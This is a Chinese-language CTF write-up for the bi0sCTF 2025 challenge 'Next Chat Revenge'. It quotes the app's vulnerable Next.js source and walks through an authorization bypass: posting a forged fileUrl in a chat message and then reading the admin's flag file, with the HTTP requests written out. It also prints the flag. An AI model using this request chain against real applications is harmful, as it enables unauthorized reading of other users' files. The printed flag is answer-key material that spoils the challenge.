# bi0sCTF 2025 - Next Chat Revenge 题解

## 题目简述

这是一个 Next.js 私聊与文件分享应用。题目 README 把预期方向概括为 “Tailwind Injection and Race”，但当前仓库源码还存在一条更直接、可逐行证明的非预期解法：消息接口允许客户端任意填写 `fileUrl`，而文件读取接口又把“某条可见消息里出现过同一 URL”当作访问授权。攻击者可以自己写入管理员 flag 的 URL，再据此读取真实文件。

服务初始化时会把 `flag.png` 复制到 `uploads/<adminId>/flag.png`。原图只包含可直接转写的一行 flag，没有必须依赖颜色、布局或图像载体才能保留的信息，因此不保留截图。图内文字为：

```text
bi0sctf{tailwind_injec_r4c3_daymm??_14a9}
```

根目录 README 写成了 `bbi0sctf{...}`，多出一个 `b`；这里以管理员 `flag.png` 的实际画面为准。

## 解题过程

`src/lib/admin.js` 在首次启动时创建 `admin`，并执行：

```javascript
const targetDir = path.join(process.cwd(), "uploads", admin.id);
const flagSrc = path.join(process.cwd(), "flag.png");
const flagDest = path.join(targetDir, "flag.png");

fs.copyFileSync(flagSrc, flagDest);
fs.unlinkSync(flagSrc);
```

所以只要知道管理员 ID，目标路径就是：

```text
/api/get-file/<adminId>/flag.png
```

普通用户登录后可请求 `/api/users/search?q=ad`。搜索接口只排除当前用户，不排除管理员，返回字段也包含 `id` 和 `name`，因此可以直接取出 `name == "admin"` 的 ID。

接着审计发送消息接口。`POST /api/conversations/<conversationId>/messages` 只要求 `content` 和 `fileUrl` 至少一个非空，并验证发送者属于该会话；它不检查 `fileUrl` 是否由上传接口生成，也不绑定文件所有者：

```javascript
const { content, fileUrl } = await req.json();
if (!content && !fileUrl) {
  return new NextResponse("Content or file required", { status: 400 });
}

await prisma.sentDirectMessage.create({
  data: { content: content || "", fileUrl, senderId, conversationId }
});
```

因此可以先通过 `POST /api/conversations` 建立任意自己参与的会话；与管理员建会话最直观：

```http
POST /api/conversations
Content-Type: application/json

{"memberTwoId":"<adminId>"}
```

得到 `conversationId` 后，自己发送一条只含伪造文件引用的消息：

```http
POST /api/conversations/<conversationId>/messages
Content-Type: application/json

{
  "content":"",
  "fileUrl":"/api/get-file/<adminId>/flag.png"
}
```

最后看 `/api/get-file/<userId>/<filename>`。当请求的 `userId` 不是当前用户时，服务端查询是否存在包含目标 `dbPath` 的消息：

```javascript
const dbPath = `/api/get-file/${userId}/${filename}`;
const isAllowedInDM = await prisma.sentDirectMessage.findFirst({
  where: {
    fileUrl: { contains: dbPath },
    OR: [
      { senderId: currentUser },
      {
        conversation: {
          OR: [
            { memberOneId: currentUser },
            { memberTwoId: currentUser }
          ]
        }
      }
    ]
  }
});
```

刚才的消息同时满足 `fileUrl contains dbPath` 和 `senderId == currentUser`，所以授权通过。服务端随即读取：

```javascript
const filePath = `uploads/${userId}/${filename}`;
const fullPath = path.join(process.cwd(), filePath);
const fileBuffer = await fs.readFile(fullPath);
```

请求下面的地址即可收到 PNG：

```http
GET /api/get-file/<adminId>/flag.png
```

这条非预期链不需要管理员访问消息，也不需要竞态窗口；`OR` 中的 `senderId` 分支意味着攻击者自己写入引用就足够。本文未启动 Next.js、数据库和登录会话做端到端 HTTP 重放，但消息写入、授权查询、文件路径和真实图片已经用当前管理员源码逐项闭合。

## 方法总结

这里的根因是把“客户端可写的资源引用”误当成“服务端授予的资源权限”。安全设计应保存不可伪造的文件记录，并用文件所有者、会话成员和消息关系做结构化关联，不能只检查字符串 URL 是否出现过。题目提示仍表明 Tailwind Injection 与 Race 是预期路线，但当前源树中的 URL 授权绕过更短且证据完整；WP 应明确标成非预期解法，而不是强行把实际利用描述成竞态。
